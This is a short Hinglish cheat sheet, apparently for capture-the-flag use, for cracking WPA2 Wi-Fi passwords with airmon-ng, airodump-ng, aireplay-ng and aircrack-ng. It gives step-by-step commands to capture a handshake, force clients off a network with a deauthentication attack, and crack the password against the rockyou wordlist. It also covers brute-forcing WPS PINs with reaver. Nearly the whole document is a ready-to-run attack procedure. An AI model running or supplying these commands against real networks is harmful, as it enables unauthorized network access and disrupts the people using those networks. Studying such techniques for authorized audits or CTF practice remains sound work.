# 📡 WIFI CRACK KARO — WPA2 Handshake

---

## STEP 1: Monitor Mode ON
```bash
airmon-ng check kill                       # interfering processes kill
airmon-ng start wlan0                      # monitor mode ON
# Interface: wlan0mon
```

## STEP 2: Networks Scan Karo
```bash
airodump-ng wlan0mon
# Note karo: BSSID, Channel, ESSID (target network)
```

## STEP 3: Target Network pe Focus
```bash
airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon
# Ye handshake capture karega — "WPA handshake" dikhna chahiye top-right
```

## STEP 4: Deauth Attack (Client Force Reconnect)
```bash
# New terminal:
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# -0 5 = 5 deauth packets
# Client reconnect karega → handshake capture hoga
```

## STEP 5: Handshake Crack Karo
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap
```

---

## CASE: Handshake File Already Di Hai
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap
```
> Seedha Step 5 pe jao — no scanning needed

---

## CASE: WPS Attack
```bash
wash -i wlan0mon                           # WPS enabled networks
reaver -i wlan0mon -b <BSSID> -vv         # WPS PIN brute force
```

---

## CASE: Monitor Mode Wapas Normal
```bash
airmon-ng stop wlan0mon
service NetworkManager start
```

---

## QUICK DECISION:
```
WiFi question
  ├─ Handshake file di? → aircrack-ng + rockyou.txt
  ├─ Capture karna hai? → airmon → airodump → aireplay deauth → aircrack
  ├─ WPS enabled? → reaver
  └─ PCAP mein WiFi? → wireshark beacon frames → SSID
```
